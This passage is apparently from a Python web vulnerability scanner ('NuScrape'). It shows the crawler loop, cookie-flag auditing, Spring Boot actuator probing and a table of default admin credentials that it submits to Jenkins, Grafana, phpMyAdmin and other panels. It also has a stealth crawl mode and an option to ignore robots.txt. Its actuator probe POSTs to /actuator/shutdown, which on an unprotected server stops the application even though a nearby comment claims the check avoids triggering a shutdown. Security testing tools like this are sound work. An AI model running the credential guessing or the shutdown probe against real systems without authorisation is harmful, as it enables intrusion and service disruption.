        if _ENT_CSP_DIRECTIVE_RE.search(hdr_name) or _ENT_CSP_DIRECTIVE_RE.search(hdr_val):
            continue
        for m in _ENT_B64_RE.finditer(hdr_val):
            _try_flag(m.group(), "base64", f"header '{hdr_name}'", sev_override="LOW")
        for m in _ENT_HEX_RE.finditer(hdr_val):
            _try_flag(m.group(), "hex", f"header '{hdr_name}'", sev_override="LOW")


# ─────────────────────────────────────────────
# Main crawler
# ─────────────────────────────────────────────

def main_crawler(start_url, same_domain_only=False, resume=False, ignore_robots=False,
                 min_workers=1, max_workers=10):
    global START_URL, SAME_DOMAIN_ONLY, _ac
    _stop_event.clear()   # ensure a fresh scan is never blocked by a previous stop
    START_URL        = start_url
    SAME_DOMAIN_ONLY = same_domain_only
    _ac = AdaptiveConcurrency(start=3, min_workers=min_workers, max_workers=max_workers)
    print(timestamp() + " [AdaptiveConcurrency] min=" + str(min_workers)
          + " max=" + str(max_workers) + " start=3 workers")
    parsed_start = urlparse(start_url)
    base_netloc  = parsed_start.netloc
    base_url     = parsed_start.scheme + "://" + base_netloc

    state = load_state() if resume else None

    if state and state.get("start_url") == start_url:
        url_queue = [(_url_priority(u), next(_pq_seq), u) for u in state["url_queue"]]
        heapq.heapify(url_queue)
        url_seen  = set(state["url_seen"])
        visited   = set(state["visited"])
        i         = state["pages_crawled"]
        same_domain_only = state.get("same_domain_only", same_domain_only)
        print(timestamp() + " Resumed: " + str(i) + " crawled, " + str(len(url_queue)) + " in queue.")
        if ignore_robots:
            print(timestamp() + " robots.txt: ignored (--ignore-robots)")
            rp = None
        else:
            rp = fetch_robots_txt(base_url)
    else:
        if resume and state:
            print(timestamp() + " Saved state is for a different domain — starting fresh.")
        url_queue = [(_url_priority(start_url), next(_pq_seq), start_url)]
        url_seen  = {start_url}
        visited   = set()
        i         = 0
        clear_state()

        # Pre-seed url_seen with URLs crawled within the last 14 days so
        # they are skipped if re-discovered during this run.
        try:
            from datetime import timedelta
            cutoff = (datetime.now() - timedelta(days=14)).strftime("%Y-%m-%d %H:%M:%S")
            _hconn = sqlite3.connect("ScrapeDB")
            _hrows = _hconn.execute(
                "SELECT url FROM HTTPHistory WHERE checked_at >= ?", (cutoff,)
            ).fetchall()
            _hconn.close()
            _recent = {r[0] for r in _hrows}
            url_seen |= _recent
            if _recent:
                print(timestamp() + f" Skipping {len(_recent)} URLs crawled in the last 14 days.")
        except Exception as _e:
            print_error(f"Could not load recent crawl history: {_e}")

        print(timestamp() + " " + _c("Starting NuScrape →", Fore.GREEN, Style.BRIGHT) + " " + start_url)
        if same_domain_only:
            print(timestamp() + " Same-domain-only: staying on " + base_netloc)

        if ignore_robots:
            print(timestamp() + " robots.txt: ignored (--ignore-robots)")
            rp = None
        else:
            print(timestamp() + " Fetching robots.txt...")
            rp = fetch_robots_txt(base_url)

        print(timestamp() + " Fetching sitemap...")
        sitemap_urls = fetch_sitemap(base_url)
        for su in sitemap_urls:
            su = _clean_url(su)
            if su not in url_seen:
                url_seen.add(su)
                _pq_push(url_queue, su)

    # Register interact.sh OOB session eagerly so the domain is ready before
    # any SSRF probes fire.  The call is idempotent — subsequent calls in
    # check_ssrf_oob() return the cached session.
    _ssrf_init_oob_client()

    _ghost_shuffle_at = random.randint(10, 20) if STEALTH_PROFILE == "GHOST" else 0
    _ghost_crawl_count = 0
    while url_queue:
        if _stop_event.is_set():
            print(timestamp() + " [*] Stop requested — halting crawler loop.")
            break
        # GHOST: periodically shuffle P3/P4 items to randomise crawl patterns
        # while preserving P1/P2 ordering.
        if STEALTH_PROFILE == "GHOST" and _ghost_shuffle_at > 0:
            _ghost_crawl_count += 1
            if _ghost_crawl_count >= _ghost_shuffle_at:
                p12 = [item for item in url_queue if item[0] <= 2]
                p34 = [item for item in url_queue if item[0] > 2]
                random.shuffle(p34)
                url_queue = p12 + p34
                heapq.heapify(url_queue)
                _ghost_crawl_count = 0
                _ghost_shuffle_at = random.randint(10, 20)

        batch = []
        batch_size = _ac.workers
        while len(batch) < batch_size and url_queue:
            url = _pq_pop(url_queue)
            if url in visited:
                continue
            if SOCIAL_FILTER_FLAGS["enabled"] and is_social_media_domain(url):
                continue
            if SKIP_GOOGLE_TRACKING and is_google_tracking_url(url):
                continue
            if not ignore_robots and not is_allowed_by_robots(rp, url):
                print(timestamp() + " Skipping (robots.txt): " + url)
                continue
            batch.append(url)
            visited.add(url)

        if not batch:
            break

        print(timestamp() + " Batch " + str(len(batch)) + " [workers=" + str(_ac.workers)
              + "] | crawled=" + str(i) + " queue=" + str(len(url_queue)))

        results = asyncio.run(crawl_batch(batch, concurrency=_ac.workers))

        for url, html, headers, elapsed, is_error, is_429 in results:
            if is_429:
                _ac.record_429()
            else:
                _ac.record(elapsed, is_error)
            if html is None:
                continue
            i += 1

            # ── Playwright fallback ──────────────────────────
            # If Playwright is enabled and the page looks JS-heavy,
            # re-fetch with a real browser to get the rendered content.
            xhr_endpoints = []
            if PLAYWRIGHT_FLAGS["enabled"] and PLAYWRIGHT_AVAILABLE:
                # Detect techs from aiohttp html first so we can check for JS frameworks
                early_techs = []
                if html:
                    try:
                        from bs4 import BeautifulSoup as _BS
                        _soup = _BS(html, "lxml")
                        _html_str = html.decode("utf-8", errors="ignore").lower()
                        _hdr_str  = str(headers).lower()
                        for tech, sigs in TECH_SIGNATURES.items():
                            if any(h.lower() in _hdr_str for h in sigs["headers"]) or                                any(p.lower() in _html_str for p in sigs["html"]):
                                early_techs.append(tech)
                    except Exception:
                        pass

                if is_js_heavy(html, early_techs):
                    print(timestamp() + " JS-heavy page detected, switching to Playwright: " + url)
                    # Run Playwright in a thread so it doesn't block the main
                    # crawl loop — sync_playwright cannot run inside asyncio
                    pw_result = [None, []]
                    def _pw_thread():
                        pw_result[0], pw_result[1] = playwright_fetch(url)
                    t = threading.Thread(target=_pw_thread, daemon=True)
                    t.start()
                    # Wait with a hard ceiling — don't hang forever
                    t.join(timeout=PLAYWRIGHT_TIMEOUT / 1000 + 10)
                    if t.is_alive():
                        print_error("Playwright thread timeout — skipping: " + url)
                    else:
                        pw_html, xhr_endpoints = pw_result[0], pw_result[1]
                        if pw_html and len(pw_html) > len(html or b""):
                            html = pw_html
                            print(timestamp() + " Playwright content richer — using rendered HTML")
                        for endpoint, method in xhr_endpoints:
                            write_to_xhr_database(url, endpoint, method)

            print(timestamp() + " Parsed: " + url)
            email_scraper(html)
            # Cookie security flag audit — runs on every page response
            check_cookie_security(url, headers)
            # JWT detection and weakness analysis
            scan_for_jwts(url, html, response_headers=headers)
            # SSRF candidate parameter flagging — informational, no HTTP requests
            flag_ssrf_candidates(url, html)
            # WebSocket endpoint discovery — runs unconditionally, no active probing
            discover_websockets(url, html, headers)
            # Entropy-based secret detection — passive, no active probes needed
            check_response_entropy(url,
                                   html if isinstance(html, str)
                                   else (html or b"").decode("utf-8", errors="ignore"),
                                   headers)
            # Passive deserialization format detection — runs unconditionally
            scan_deserial_passive(url, html, headers)
            # Active probe checks — only run when --active-probes is enabled
            if ACTIVE_PROBES:
                # Pre-queue baselines in the background so they can complete while
                # the earlier non-baseline checks (SSRF, redirect, GraphQL, etc.) run.
                _schedule_baselines_for_page(url, html)
                # SSRF OOB confirmation — interactsh callback for URL-accepting params
                check_ssrf_oob(url, html)
                # Open redirect detection — probes URL params with canary URL
                check_open_redirects(url, html)
                # GraphQL introspection — probe if this URL looks like a GraphQL endpoint
                probe_graphql_url(url)
                # Mass assignment — injects privileged fields into POST/PUT form endpoints
                check_mass_assignment(url, html)
                # API version enumeration — probes adjacent versions of versioned paths
                check_api_versioning(url)
                # Path traversal detection — probes file-like parameters
                check_path_traversal(url, html)
                # SSTI detection — probes URL params with arithmetic template expressions
                check_ssti(url, html)
                # CRLF injection detection — probes URL params for header injection
                check_crlf_injection(url, html)
                # XXE injection — probes XML-accepting and SOAP endpoints
                check_xxe_injection(url, html, headers)
                # Prototype pollution — server-side body/query probes
                check_prototype_pollution(url, html)
                # SQL injection — error-based and time-based blind detection
                check_sqli(url, html)
                # Command injection — canary echo-based detection
                check_cmdi(url, html)
                # LDAP injection — error-based and auth bypass detection
                check_ldap_injection(url, html)
                # Insecure deserialization — active confirmation of passive signals
                check_insecure_deserialization(url, html, headers)
                # Price manipulation — tests checkout/payment endpoints for
                # client-side price/quantity bypass vulnerabilities
                check_price_manipulation(url, html)
                # JWT algorithm confusion — alg:none, RS256→HS256, weak secret
                check_jwt_confusion(url, html, headers)
                # Race condition — barrier-synchronised simultaneous probing of
                # state-changing endpoints (coupon, reset, payment, vote, etc.)
                check_race_condition(url, html)
                # HTTP Parameter Pollution — duplicate-param parsing discrepancy,
                # WAF bypass via split payloads, first/last-wins detection
                check_hpp(url, html)
                # Web cache poisoning — unkeyed header injection, fat GET,
                # parameter cloaking on cacheable endpoints
                check_web_cache_poisoning(url, html, headers)
            # IDOR candidate detection — runs in background thread with timeout
            # to prevent hung verification requests stalling the crawl
            _idor_thread = threading.Thread(
                target=check_idor_candidates, args=(url, html), daemon=True
            )
            _idor_thread.start()
            _idor_thread.join(timeout=30)  # max 30s per page for IDOR checks
            # JS bundle analysis — extract endpoints, secrets, staging URLs
            if PLAYWRIGHT_FLAGS["enabled"] or True:  # always run JS analysis
                extract_and_analyse_js(url, html)
            # S3 bucket references in page HTML
            extract_and_probe_s3_buckets(html, url)
            anchors     = parse_anchors_from_html(html)
            new_domains = get_domain_names(anchors, url_queue, url_seen, base_netloc, same_domain_only)

            _base_root = base_netloc.lstrip("www.")
            for domain in new_domains:
                if domain not in visited:
                    _d_netloc = urlparse(domain).netloc.lstrip("www.")
                    if _d_netloc == _base_root or _d_netloc.endswith("." + _base_root):
                        enrich_domain(domain, response_headers=headers, html_content=html)

        if i % QUEUE_SAVE_INTERVAL == 0 and i > 0:
            save_state(start_url, url_queue, url_seen, visited, i, same_domain_only)

    # Wait for all JS analysis threads to finish writing to the DB before probing
    with _js_analysis_threads_lock:
        pending = list(_js_analysis_threads)
    if pending:
        print(timestamp() + f" Waiting for {len(pending)} JS analysis threads to complete...")
        for t in pending:
            t.join(timeout=30)

    probe_js_endpoints(base_url=start_url)

    _shutdown_playwright()
    clear_state()
    print(timestamp() + " " + _c("Done! Crawled " + str(i) + " pages.", Fore.GREEN, Style.BRIGHT))
    sys.exit(0)


# ─────────────────────────────────────────────
# Cookie security flag auditing
# ─────────────────────────────────────────────

# Cookies whose names suggest they carry session/auth data
SESSION_COOKIE_PATTERNS = re.compile(
    r'(sess|session|auth|token|jwt|login|user|uid|account|remember|csrf|xsrf|sid|id)',
    re.I
)

# Cookie names that strongly indicate session/auth data — HIGH for missing HttpOnly
_SENSITIVE_COOKIE_NAMES = re.compile(
    r'(session|token|auth|jwt|sid|login)',
    re.I
)

# Per-domain, per-cookie-name dedup so each unique (domain, name, issue) fires once
_cookie_seen: dict = {}  # domain -> set of (name, issue_key)

def check_cookie_security(url, response_headers):
    """
    Parse Set-Cookie headers from a response and flag cookies missing
    security flags. Deduplicates per (domain, cookie name, issue) so
    each unique problem fires exactly once per domain.

    Severity per issue type:
      - Missing HttpOnly on sensitive cookie: HIGH
      - Missing HttpOnly on other session cookie: MEDIUM
      - Missing Secure on HTTPS page: MEDIUM
      - SameSite=None without Secure: HIGH
      - Missing SameSite: LOW
    """
    domain  = urlparse(url).netloc
    is_https = url.startswith("https://")

    raw_cookies = response_headers.get("Set-Cookie", "") or \
                  response_headers.get("set-cookie", "")
    if not raw_cookies:
        return

    cookie_list = [raw_cookies] if isinstance(raw_cookies, str) else list(raw_cookies)
    seen = _cookie_seen.setdefault(domain, set())

    for raw in cookie_list:
        parts = [p.strip() for p in raw.split(";")]
        if not parts:
            continue
        name = parts[0].split("=")[0].strip()

        if not SESSION_COOKIE_PATTERNS.search(name):
            continue

        flags = raw.lower()
        is_sensitive = bool(_SENSITIVE_COOKIE_NAMES.search(name))

        # ── Missing HttpOnly ──────────────────────────────────────
        if "httponly" not in flags:
            key = (name, "httponly")
            if key not in seen:
                seen.add(key)
                severity = "HIGH" if is_sensitive else "MEDIUM"
                alert(
                    "INSECURE COOKIE: MISSING HttpOnly",
                    severity,
                    url,
                    f"Cookie '{name}' has no HttpOnly flag — readable by JavaScript, "
                    f"enabling theft via XSS"
                )
                print(timestamp() + f" Cookie issue [{severity}]: '{name}' missing HttpOnly on {url}")

        # ── Missing Secure (HTTPS pages only) ────────────────────
        if is_https and "secure" not in flags:
            key = (name, "secure")
            if key not in seen:
                seen.add(key)
                alert(
                    "INSECURE COOKIE: MISSING Secure",
                    "MEDIUM",
                    url,
                    f"Cookie '{name}' has no Secure flag on an HTTPS page — "
                    f"may be transmitted over HTTP"
                )
                print(timestamp() + f" Cookie issue [MEDIUM]: '{name}' missing Secure on {url}")

        # ── SameSite=None without Secure ─────────────────────────
        if "samesite=none" in flags and "secure" not in flags:
            key = (name, "samesite_none_insecure")
            if key not in seen:
                seen.add(key)
                alert(
                    "INSECURE COOKIE: SameSite=None WITHOUT Secure",
                    "HIGH",
                    url,
                    f"Cookie '{name}' sets SameSite=None without Secure — "
                    f"cross-site requests will include this cookie over plain HTTP"
                )
                print(timestamp() + f" Cookie issue [HIGH]: '{name}' SameSite=None without Secure on {url}")

        # ── Missing SameSite ──────────────────────────────────────
        elif "samesite" not in flags:
            key = (name, "samesite")
            if key not in seen:
                seen.add(key)
                alert(
                    "INSECURE COOKIE: MISSING SameSite",
                    "LOW",
                    url,
                    f"Cookie '{name}' has no SameSite flag — vulnerable to CSRF"
                )
                print(timestamp() + f" Cookie issue [LOW]: '{name}' missing SameSite on {url}")


# ─────────────────────────────────────────────
# Default credential checking
# ─────────────────────────────────────────────

# Known admin panel paths → (service name, credential pairs to try, success indicators)
# success_indicator: string in response body that confirms successful login
DEFAULT_CREDS = [
    # Jenkins
    {
        "service":  "Jenkins",
        "paths":    ["/j_spring_security_check", "/j_acegi_security_check"],
        "method":   "POST",
        "payloads": [
            {"j_username": "admin", "j_password": "admin"},
            {"j_username": "admin", "j_password": "password"},
            {"j_username": "admin", "j_password": ""},
        ],
        "detect_path":   "/login",
        "detect_body":   ["jenkins", "j_username"],
        "success_body":  ["Dashboard [Jenkins]", "manage jenkins", "build history"],
        "success_headers": ["X-Jenkins", "X-Powered-By:Jenkins"],
        "fail_redirect": "/loginError",
    },
    # Grafana
    {
        "service":  "Grafana",
        "paths":    ["/api/login"],
        "method":   "POST_JSON",
        "payloads": [
            {"user": "admin", "password": "admin"},
            {"user": "admin", "password": "Admin@123"},
            {"user": "admin", "password": "grafana"},
        ],
        "detect_path":   "/login",
        "detect_body":   ["grafana", "grafana-app"],
        "success_body":  ['"message":"Logged in"', "Logged in"],
        "fail_body":     ["Invalid username or password"],
    },
    # Kibana
    {
        "service":  "Kibana",
        "paths":    ["/api/security/v1/login", "/internal/security/login"],
        "method":   "POST_JSON",
        "payloads": [
            {"username": "elastic", "password": "elastic"},
            {"username": "kibana",  "password": "kibana"},
            {"username": "admin",   "password": "admin"},
        ],
        "detect_path":   "/app/kibana",
        "detect_body":   ["kibana", "kbn-"],
        "success_body":  ['"statusCode":200', "token"],
        "fail_body":     ["Unauthorized", "Invalid credentials"],
    },
    # Jupyter Notebook
    {
        "service":  "Jupyter",
        "paths":    ["/api/login"],
        "method":   "POST",
        "payloads": [
            {"password": ""},
            {"password": "jupyter"},
            {"password": "admin"},
        ],
        "detect_path":   "/login",
        "detect_body":   ["jupyter", "ipython"],
        "success_body":  ["notebook_list", "/tree"],
        "fail_body":     ["Invalid credentials"],
    },
    # Adminer
    {
        "service":  "Adminer",
        "paths":    ["/adminer.php", "/adminer/", "/adminer"],
        "method":   "POST",
        "payloads": [
            {"auth[server]": "localhost", "auth[username]": "root", "auth[password]": "", "auth[db]": ""},
            {"auth[server]": "localhost", "auth[username]": "admin", "auth[password]": "admin", "auth[db]": ""},
        ],
        "detect_path":   None,  # detection is path-based
        "detect_body":   ["adminer", "login - adminer"],
        "success_body":  ["adminer.org", ">Adminer<", "adminer-login", "select database", "Select database"],
        "fail_body":     ["Invalid credentials", "Access denied"],
    },
    # phpMyAdmin
    {
        "service":  "phpMyAdmin",
        "paths":    ["/phpmyadmin/index.php", "/pma/index.php", "/phpMyAdmin/index.php"],
        "method":   "POST",
        "payloads": [
            {"pma_username": "root",  "pma_password": ""},
            {"pma_username": "root",  "pma_password": "root"},
            {"pma_username": "admin", "pma_password": "admin"},
        ],
        "detect_path":   None,
        "detect_body":   ["phpmyadmin", "pma_navigation"],
        "success_body":  ["pma_table_grid", "phpmyadmin/server_databases"],
        "fail_body":     ["Cannot log in", "Access denied"],
    },
    # Traefik dashboard
    {
        "service":  "Traefik",
        "paths":    ["/dashboard/"],
        "method":   "GET",
        "payloads": [{}],
        "detect_path":   "/dashboard/",
        "detect_body":   ["traefik"],
        "success_body":  ["traefik", "@router"],
        "fail_body":     [],
    },
    # RabbitMQ Management
    {
        "service":  "RabbitMQ",
        "paths":    ["/api/whoami"],
        "method":   "GET_BASIC",
        "payloads": [
            {"username": "guest", "password": "guest"},
            {"username": "admin", "password": "admin"},
        ],
        "detect_path":   "/",
        "detect_body":   ["rabbitmq", "management plugin"],
        "success_body":  ['"name":"guest"', '"name":"admin"', '"tags"'],
        "fail_body":     ["Not authorized"],
    },
]

_defcred_checked = set()

def check_default_credentials(base_url, domain):
    """
    For each known admin panel, check if it's present at the base URL
    then attempt default credential pairs. Alerts CRITICAL on success.

    Two-phase:
      1. Detect: GET detect_path, check detect_body strings
      2. Attempt: POST/GET login endpoint with each credential pair
    """
    if domain in _defcred_checked:
        return
    _defcred_checked.add(domain)

    for panel in DEFAULT_CREDS:
        service = panel["service"]

        # ── Phase 1: Detect if service is present ──────────────
        detect_path = panel.get("detect_path")
        if detect_path:
            detect_url = base_url.rstrip("/") + detect_path
            dresp = safe_get(detect_url, timeout=5)
            if not dresp or dresp.status_code not in (200, 401, 403):
                continue
            body_lower = dresp.text.lower()
            if not any(sig.lower() in body_lower for sig in panel["detect_body"]):
                continue
            print(timestamp() + f" Detected {service} at {detect_url} — trying default creds...")
        else:
            # Path-based detection (Adminer, phpMyAdmin)
            detected = False
            for path in panel["paths"]:
                check_url = base_url.rstrip("/") + path
                dresp = safe_get(check_url, timeout=5)
                if dresp and dresp.status_code == 200:
                    if any(sig.lower() in dresp.text.lower() for sig in panel["detect_body"]):
                        detected = True
                        break
            if not detected:
                continue
            print(timestamp() + f" Detected {service} — trying default creds...")

        # ── Phase 2: Try credential pairs ──────────────────────
        method  = panel["method"]
        success = False

        for path in panel["paths"]:
            if success:
                break
            login_url = base_url.rstrip("/") + path

            for creds in panel["payloads"]:
                try:
                    stealth_delay(domain)
                    if method == "POST":
                        resp = _get_session().post(login_url, data=creds,
                                             headers=create_request_header(),
                                             timeout=6, allow_redirects=True)
                    elif method == "POST_JSON":
                        resp = _get_session().post(login_url, json=creds,
                                             headers={**create_request_header(),
                                                      "Content-Type": "application/json"},
                                             timeout=6, allow_redirects=True)
                    elif method == "GET_BASIC":
                        resp = _get_session().get(login_url,
                                            auth=(creds.get("username",""), creds.get("password","")),
                                            headers=create_request_header(),
                                            timeout=6)
                    else:  # GET
                        resp = _get_session().get(login_url, headers=create_request_header(), timeout=6)

                    body = resp.text.lower()

                    # Check for explicit failure strings first
                    fail_sigs = panel.get("fail_body", [])
                    if any(f.lower() in body for f in fail_sigs):
                        continue

                    # Check for fail redirect
                    fail_redir = panel.get("fail_redirect", "")
                    if fail_redir and fail_redir in resp.url:
                        continue

                    # Check for success — require body or header confirmation, never bare 200
                    success_sigs = panel.get("success_body", [])
                    success_hdrs = panel.get("success_headers", [])
                    header_match = any(
                        (h.split(":")[0] in resp.headers and
                         (len(h.split(":")) == 1 or h.split(":", 1)[1].lower() in resp.headers.get(h.split(":")[0], "").lower()))
                        for h in success_hdrs
                    )
                    if (success_sigs and any(s.lower() in body for s in success_sigs)) or header_match:
                        cred_str = str(creds)
                        _lu   = login_url
                        _cr   = dict(creds)
                        _mt   = method
                        _ss   = list(success_sigs)
                        _sh   = list(success_hdrs)
                        _fail = list(panel.get("fail_body", []))

                        def _re_req(_u=_lu, _c=_cr, _m=_mt):
                            if _m == "POST":
                                return _get_session().post(_u, data=_c, headers=create_request_header(), timeout=6, allow_redirects=True)
                            elif _m == "POST_JSON":
                                return _get_session().post(_u, json=_c, headers={**create_request_header(), "Content-Type": "application/json"}, timeout=6, allow_redirects=True)
                            elif _m == "GET_BASIC":
                                return _get_session().get(_u, auth=(_c.get("username", ""), _c.get("password", "")), headers=create_request_header(), timeout=6)
                            return _get_session().get(_u, headers=create_request_header(), timeout=6)

                        def _confirm(r, _s=_ss, _h=_sh, _f=_fail):
                            b = r.text.lower()
                            if any(f.lower() in b for f in _f):
                                return False
                            hm = any(
                                h.split(":")[0] in r.headers and (
                                    len(h.split(":")) == 1
                                    or h.split(":", 1)[1].lower() in r.headers.get(h.split(":")[0], "").lower()
                                )
                                for h in _h
                            )
                            return bool((_s and any(s.lower() in b for s in _s)) or hm)

                        _msv_verify(
                            "CRITICAL", f"DEFAULT CREDENTIALS ACCEPTED: {service}",
                            login_url,
                            f"{service} login succeeded with credentials: {cred_str}",
                            _re_req, _confirm,
                        )
                        print(timestamp() + f" [!!] DEFAULT CREDS WORK: {service} at {login_url} with {cred_str}")
                        success = True
                        break

                except Exception as e:
                    print_error(f"Default cred attempt failed for {service} at {login_url}: {e}")

        if not success and detect_path:
            print(timestamp() + f" {service}: no default creds accepted at {base_url}")


# ─────────────────────────────────────────────
# Spring Boot Actuator exposure detection
# ─────────────────────────────────────────────

# Actuator endpoints ordered by severity
# (path, severity, description)
ACTUATOR_ENDPOINTS = [
    ("/actuator/env",         "CRITICAL", "Exposes all environment variables and config — may contain passwords, API keys, DB credentials"),
    ("/actuator/heapdump",    "CRITICAL", "Full JVM heap dump download — contains in-memory secrets, session tokens, plaintext passwords"),
    ("/actuator/shutdown",    "CRITICAL", "Remote application shutdown endpoint — POST request terminates the JVM process"),
    ("/actuator/httptrace",   "HIGH",     "Full HTTP request/response history including auth headers and cookies"),
    ("/actuator/mappings",    "HIGH",     "Exposes all Spring MVC route mappings — full internal API surface"),
    ("/actuator/beans",       "HIGH",     "Lists all Spring beans and their dependencies — internal architecture exposure"),
    ("/actuator/configprops", "HIGH",     "All @ConfigurationProperties values including credentials"),
    ("/actuator/loggers",     "MEDIUM",   "Log level configuration — can be modified to enable debug logging"),
    ("/actuator/metrics",     "MEDIUM",   "Application performance metrics and internal counters"),
    ("/actuator/info",        "MEDIUM",   "App version, git commit hash, build info"),
    ("/actuator",             "MEDIUM",   "Actuator root — lists all enabled endpoints"),
    # Older Spring Boot 1.x paths
    ("/env",                  "CRITICAL", "Spring Boot 1.x env endpoint — exposes all environment variables"),
    ("/dump",                 "CRITICAL", "Spring Boot 1.x thread dump"),
    ("/trace",                "HIGH",     "Spring Boot 1.x HTTP trace"),
    ("/mappings",             "HIGH",     "Spring Boot 1.x route mappings"),
    ("/beans",                "HIGH",     "Spring Boot 1.x bean list"),
    ("/autoconfig",           "MEDIUM",   "Spring Boot 1.x autoconfiguration report"),
    ("/metrics",              "MEDIUM",   "Spring Boot 1.x metrics"),
]

# Body signatures that confirm a response is a real Actuator endpoint
ACTUATOR_BODY_SIGNATURES = [
    "activeProfiles", "propertySources", "applicationConfig",
    "systemEnvironment", "systemProperties", "managementConfigurationProperties",
    "contexts", "beans", "mappings", "dispatcherServlets",
]

_actuator_checked = set()

def check_actuator_exposure(base_url, domain):
    """
    Probe Spring Boot Actuator endpoints at the given base URL.
    Confirms findings by checking response body for Actuator-specific
    JSON keys before alerting — avoids false positives on generic 200s.

    CRITICAL for env/heapdump (direct credential exposure).
    HIGH for mappings/beans/httptrace (architecture/session exposure).
    MEDIUM for informational endpoints.
    """
    if domain in _actuator_checked:
        return
    _actuator_checked.add(domain)

    for path, severity, description in ACTUATOR_ENDPOINTS:
        # /actuator/shutdown must be tested via POST — skip it in the GET loop
        # and handle it separately below to avoid accidentally triggering a shutdown.
        if "shutdown" in path:
            continue
        url = base_url.rstrip("/") + path
        try:
            # allow_redirects=False — a 301/302 to the homepage means the
            # endpoint doesn't exist. CloudFront and nginx redirect unknown
            # paths rather than returning 404, causing false positives.
            stealth_delay(domain)
            resp = _get_session().get(url, headers=create_request_header(),
                                timeout=5, allow_redirects=False)
            if not resp or resp.status_code not in (200, 401, 403):
                continue

            # 401/403 means the endpoint exists but is auth-protected —
            # worth logging but not alerting as CRITICAL
            if resp.status_code in (401, 403):
                print(timestamp() + f" Actuator endpoint exists (protected): {url} [{resp.status_code}]")
                continue

            body_bytes = resp.content
            body       = resp.text
            ct         = resp.headers.get("Content-Type", "")

            # heapdump returns binary HPROF format.
            # Verify magic bytes: real dumps start with "JAVA PROFILE"
            # (e.g. "JAVA PROFILE 1.0.1\0" or "JAVA PROFILE 1.0.2\0")
            # A WAF/CDN challenge page or HTML error will never match this.
            if "heapdump" in path:
                hprof_magic = b"JAVA PROFILE"
                if body_bytes[:12] == hprof_magic:
                    alert(
                        "SPRING BOOT ACTUATOR EXPOSED",
                        severity,
                        url,
                        f"{description}. HPROF magic bytes confirmed. "
                        f"Response size: {len(body_bytes)} bytes"
                    )
                    print(timestamp() + f" [!!] Actuator heapdump exposed (HPROF confirmed): {url} ({len(body_bytes)} bytes)")
                else:
                    print(timestamp() + f" Heapdump probe returned 200 but HPROF magic not found — likely WAF/CDN interference: {url}")
                continue

            # Require at least one body signature — a bare 200 with JSON
            # content-type is not sufficient (CDNs and reverse proxies can
            # return JSON error pages that match the content-type check).
            if any(sig in body for sig in ACTUATOR_BODY_SIGNATURES):
                alert(
                    "SPRING BOOT ACTUATOR EXPOSED",
                    severity,
                    url,
                    description
                )
                print(timestamp() + f" [!!] Actuator endpoint exposed [{severity}]: {url}")

        except Exception as e:
            print_error(f"check_actuator_exposure failed for {url}: {e}")

    # ── Shutdown endpoint — requires POST ─────────────────────────────────────
    # We only check whether the endpoint *exists* by sending a POST and reading
    # the response. We do NOT follow any redirect or retry. A 200 with a JSON
    # body containing "message" confirms the endpoint is live; a 401/403 means
    # it exists but is protected. We never call it twice (domain dedup above).
    shutdown_url = base_url.rstrip("/") + "/actuator/shutdown"
    try:
        stealth_delay(domain)
        shutdown_resp = _get_session().post(
            shutdown_url,
            headers=create_request_header(),
            timeout=5,
            allow_redirects=False,
            verify=False,
        )
        if shutdown_resp.status_code == 200:
            body = shutdown_resp.text
            if "message" in body.lower() or "shutdown" in body.lower():
                alert(
                    "SPRING BOOT ACTUATOR SHUTDOWN EXPOSED",
                    "CRITICAL",
                    shutdown_url,
                    "Spring Boot /actuator/shutdown accepted a POST request — "
                    "the endpoint is enabled and unauthenticated; an attacker can "
                    "remotely terminate the application process. Disable via "
                    "management.endpoint.shutdown.enabled=false"
                )
                print(timestamp() + f" [!!] Actuator shutdown EXPOSED: {shutdown_url}")
        elif shutdown_resp.status_code in (401, 403):
            print(timestamp() + f" Actuator shutdown exists (protected): {shutdown_url} [{shutdown_resp.status_code}]")
    except Exception as e:
        print_error(f"check_actuator_exposure (shutdown) failed for {shutdown_url}: {e}")


# ─────────────────────────────────────────────
# Technology-specific security checks
# ─────────────────────────────────────────────

_tech_specific_checked: set = set()


def _is_catch_all(base_url: str) -> bool:
    """
    Return True if the server returns 200 or a homepage redirect for a
    guaranteed-nonexistent path — indicates catch-all routing that would
    produce false positives on path-based probes.
    """
    canary = (base_url.rstrip("/")
              + "/probe-canary-" + str(random.randint(100000, 999999)))
    try:
        resp = safe_get(canary, timeout=6)
        if not resp:
            return False
        if resp.status_code == 200:
            return True
        if resp.status_code in (301, 302, 303, 307, 308):
            loc = resp.headers.get("Location", "").rstrip("/")
            if loc in (base_url.rstrip("/"), "/", ""):
                return True
    except Exception:
        pass
    return False


def check_technology_specific(base_url: str, domain: str,
                               detected_techs: list) -> None:
    """
    Run targeted security checks once a CMS or framework is identified.

    Each check:
    - Uses the shared catch-all guard to avoid false positives
    - Only fires for confirmed technologies
    - Deduplicates per domain
    - Confirms findings with body or content-type signatures before alerting

    Covers: WordPress, Laravel, Spring Boot, Django, Ruby on Rails,
            Drupal, Joomla.
    """
    if not detected_techs:
        return
    if domain in _tech_specific_checked:
        return
    _tech_specific_checked.add(domain)

    tech_set = set(detected_techs)
    catch_all = _is_catch_all(base_url)
    if catch_all:
        print(timestamp() + f" [tech] Catch-all server on {domain} — path probes will use body confirmation")

    def _probe(path: str, method: str = "get") -> tuple:
        """GET/POST a path; returns (status, body_text, content_type)."""
        try:
            stealth_delay(domain)
            url = base_url.rstrip("/") + path
            resp = _get_session().request(
                method, url,
                headers=create_request_header(),
                timeout=8,
                allow_redirects=False,
                verify=False,
            )
            return resp.status_code, resp.text, resp.headers.get("Content-Type", "")
        except Exception:
            return 0, "", ""

    # ── WordPress ─────────────────────────────────────────────────────────────
    if "WordPress" in tech_set:
        # /wp-login.php
        status, body, ct = _probe("/wp-login.php")
        if status == 200 and ("wp-login" in body.lower() or "wordpress" in body.lower()
                              or "password" in body.lower()):
            alert(
                "WORDPRESS LOGIN PAGE EXPOSED",
                "MEDIUM",
                base_url + "/wp-login.php",
                "WordPress login page is publicly accessible — enables credential "
                "brute-force attacks. Consider restricting access by IP or adding "
                "rate limiting and lockout policies."
            )
            print(timestamp() + f" [!] WordPress wp-login.php exposed: {domain}")

        # /xmlrpc.php
        status, body, ct = _probe("/xmlrpc.php")
        if status == 200 and ("xmlrpc" in body.lower() or "xml" in ct.lower()):
            alert(
                "WORDPRESS XMLRPC ENABLED",
                "MEDIUM",
                base_url + "/xmlrpc.php",
                "WordPress XML-RPC interface is accessible — enables brute-force "
                "amplification via system.multicall, SSRF to internal services, "
                "and denial of service. Disable unless required by a plugin."
            )
